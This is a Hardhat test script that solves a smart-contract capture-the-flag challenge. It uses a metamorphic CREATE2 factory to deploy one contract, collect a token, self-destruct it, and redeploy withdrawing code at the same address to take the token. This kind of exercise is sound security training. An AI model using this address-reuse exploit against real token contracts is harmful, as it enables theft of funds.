import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract } from "ethers";
import {
    ChallengeToken,
} from "../typechain";

// This "Challenge Setup" block must be left as-is
describe("Challenge Setup", function () {
    it("Should deploy ChallengeToken", async function () {
        const ChallengeTokenFactory = await ethers.getContractFactory("ChallengeToken", (await ethers.getSigners()).pop());
        const challengeToken = await ChallengeTokenFactory.deploy();
        await challengeToken.deployed();
    });
});

// Try to solve the challenge below this line
// Run `npx hardhat ctf-try` to test your solution locally
// Run `npx hardhat ctf-try --submit` to submit your solution to the remote CTF node and get the real flag
describe("Solve Challenge", function () {
    let challengeToken: ChallengeToken;
    let onlyICanHazTokenImplementation: Contract;
    let metamorphicContractFactory: Contract;
    let withdrawerImplementation: Contract;
    let deployedOnlyICanHazTokenContractAddress: string;
    let deployedWithdrawer: string;


    it("Should deploy contracts succesfully", async function () {
        challengeToken = await ethers.getContractAt("ChallengeToken", "0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f");
        // console.log("ChallengeToken succesfully deployed at", challengeToken.address);

        const OnlyICanHazTokenFactory = await ethers.getContractFactory("OnlyICanHazToken");
        onlyICanHazTokenImplementation = await OnlyICanHazTokenFactory.deploy();
        await onlyICanHazTokenImplementation.deployed();
        // console.log("OnlyICanHazToken (implementation) succesfully deployed at", onlyICanHazTokenImplementation.address);

        const MetamorphicContractFactory = await ethers.getContractFactory("MetamorphicContractFactory");
        metamorphicContractFactory = await MetamorphicContractFactory.deploy("0x");
        await metamorphicContractFactory.deployed();
        // console.log("MetamorphicContractFactory succesfully deployed at", metamorphicContractFactory.address);

        const WithdrawerFactory = await ethers.getContractFactory("Withdrawer");
        withdrawerImplementation = await WithdrawerFactory.deploy();
        await withdrawerImplementation.deployed();
        // console.log("Withdrawer (implementation) succesfully deployed at", withdrawerImplementation.address);
    });

    it("Should deploy OnlyICanHazToken using MetamorphicContractFactory", async function () {
        const [EOA] = await ethers.getSigners();
        const salt = EOA.address + '000000000000000000000000';
        deployedOnlyICanHazTokenContractAddress = await metamorphicContractFactory.callStatic.deployMetamorphicContractFromExistingImplementation(salt, onlyICanHazTokenImplementation.address, "0x")

        await expect(metamorphicContractFactory.deployMetamorphicContractFromExistingImplementation(salt, onlyICanHazTokenImplementation.address, "0x")).to.not.reverted;
        // console.log("OnlyICanHazToken succesfully deployed at", deployedOnlyICanHazTokenContractAddress);
    });

    it("Should send OnlyICanHazToken a token", async function () {
        expect(await challengeToken.balanceOf(deployedOnlyICanHazTokenContractAddress)).to.equal(0);
        await challengeToken.can_i_haz_token(deployedOnlyICanHazTokenContractAddress);
        expect(await challengeToken.balanceOf(deployedOnlyICanHazTokenContractAddress)).to.equal(1);
    });

    it("Should destroy OnlyICanHazToken", async function () {
        const [EOA] = await ethers.getSigners();
        const onlyICanHazToken = new Contract(deployedOnlyICanHazTokenContractAddress, (await ethers.getContractFactory("OnlyICanHazToken")).interface, EOA)

        console.log()
        await expect(onlyICanHazToken.bye()).to.not.reverted;
    });

    it("Should deploy Withdrawer using MetamorphicContractFactory", async function () {
        const [EOA] = await ethers.getSigners();
        const salt = EOA.address + '000000000000000000000000';
        deployedWithdrawer = await metamorphicContractFactory.callStatic.deployMetamorphicContractFromExistingImplementation(salt, withdrawerImplementation.address, "0x")

        await expect(metamorphicContractFactory.deployMetamorphicContractFromExistingImplementation(salt, withdrawerImplementation.address, "0x")).to.not.reverted;
        // console.log("Withdrawer succesfully deployed at", deployedWithdrawer);
    });

    it("Should withdraw ChallengeTokens from Withdrawer", async function () {
        const [EOA] = await ethers.getSigners();
        const withdrawer = new Contract(deployedOnlyICanHazTokenContractAddress, (await ethers.getContractFactory("Withdrawer")).interface, EOA)

        expect(await challengeToken.balanceOf(EOA.address)).to.equal(0);
        await expect(withdrawer.withdraw(challengeToken.address)).to.not.reverted;
        expect(await challengeToken.balanceOf(EOA.address)).to.equal(1);
    });

    it("Should return the winning flag", async function () {
        const returnedFlag = await challengeToken.did_i_win()

        console.log(`\tThe returned flag is: "${returnedFlag}"`)

        expect(returnedFlag).to.not.be.equal("try harder");
    });
});


